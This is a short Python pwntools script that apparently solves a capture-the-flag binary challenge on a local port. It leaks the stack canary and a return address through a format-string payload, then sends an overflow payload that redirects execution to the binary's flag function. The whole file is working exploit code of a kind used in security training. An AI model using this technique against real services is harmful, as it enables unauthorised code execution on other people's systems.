#!/usr/bin/env python3

# Bu solution 100% stable değil
# hata verirse tekrar çalıştırın

from pwn import *

elf = ELF("chal")
# p = elf.process()
p = remote("127.0.0.1", 9002)

p.recvuntil(b"misin?")

# get the canary
p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
p.recv()
canary_ret = p.recv().decode().split(".")
canary = int(canary_ret[14], 16)
old_rbp = int(canary_ret[15], 16)
retaddr = int(canary_ret[16], 16)

print("retaddr:",hex(retaddr))
elf_base = retaddr - 0x0124a
elf.address = elf_base

print("canary:",hex(canary))
print("main:",hex(elf.symbols["main"]))
print("flag:",hex(elf.symbols["flag"]))

payload = b"A"*0x48
payload += p64(canary)
payload += p64(old_rbp)
payload += p64(elf.symbols["flag"] + 4)
# payload += p64(retaddr) # p64(elf.symbols["main"])

p.sendline(payload)
print(p.recv())
flag = p.recv().decode()
print("flag:",flag)

